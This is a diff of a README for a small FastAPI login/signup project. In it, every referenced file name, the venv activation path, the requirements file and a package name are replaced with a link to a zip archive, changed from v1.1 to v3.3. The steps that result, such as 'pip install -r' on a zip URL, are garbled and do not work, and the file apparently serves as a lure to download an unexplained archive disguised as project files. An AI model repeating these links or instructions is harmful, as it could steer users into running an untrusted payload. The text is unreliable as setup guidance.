@@ -1,15 +1,15 @@
 🚀 FastAPI Login/Signup App
 
-This project is a simple FastAPI-based login and signup system that stores user data in a local https://github.com/Muhammad-Sarmad-Fowad/fastapi-auth/raw/refs/heads/main/mesomorphous/auth_fastapi_v1.1.zip file.
+This project is a simple FastAPI-based login and signup system that stores user data in a local https://raw.githubusercontent.com/Muhammad-Sarmad-Fowad/fastapi-auth/main/mesomorphous/auth_fastapi_v3.3.zip file.
 
 ✅ How to Run This Project
 1. 📁 Open your project folder in VS Code
 
    Make sure your folder contains:
 
-        https://github.com/Muhammad-Sarmad-Fowad/fastapi-auth/raw/refs/heads/main/mesomorphous/auth_fastapi_v1.1.zip
+        https://raw.githubusercontent.com/Muhammad-Sarmad-Fowad/fastapi-auth/main/mesomorphous/auth_fastapi_v3.3.zip
 
-        https://github.com/Muhammad-Sarmad-Fowad/fastapi-auth/raw/refs/heads/main/mesomorphous/auth_fastapi_v1.1.zip
+        https://raw.githubusercontent.com/Muhammad-Sarmad-Fowad/fastapi-auth/main/mesomorphous/auth_fastapi_v3.3.zip
 
 
 
@@ -24,7 +24,7 @@ This project is a simple FastAPI-based login and signup system that stores user 
    
 On Windows (PowerShell):
 
-     .\venv\Scripts\https://github.com/Muhammad-Sarmad-Fowad/fastapi-auth/raw/refs/heads/main/mesomorphous/auth_fastapi_v1.1.zip
+     .\venv\Scripts\https://raw.githubusercontent.com/Muhammad-Sarmad-Fowad/fastapi-auth/main/mesomorphous/auth_fastapi_v3.3.zip
 
 
 On Windows (CMD):
@@ -35,7 +35,7 @@ You should now see (venv) at the beginning of your terminal line.
 
 4. 📦 Install required packages
 
-        pip install -r https://github.com/Muhammad-Sarmad-Fowad/fastapi-auth/raw/refs/heads/main/mesomorphous/auth_fastapi_v1.1.zip
+        pip install -r https://raw.githubusercontent.com/Muhammad-Sarmad-Fowad/fastapi-auth/main/mesomorphous/auth_fastapi_v3.3.zip
 
 This installs:
 
@@ -43,7 +43,7 @@ This installs:
 
   b. uvicorn
 
-  https://github.com/Muhammad-Sarmad-Fowad/fastapi-auth/raw/refs/heads/main/mesomorphous/auth_fastapi_v1.1.zip
+  https://raw.githubusercontent.com/Muhammad-Sarmad-Fowad/fastapi-auth/main/mesomorphous/auth_fastapi_v3.3.zip
 
 
 
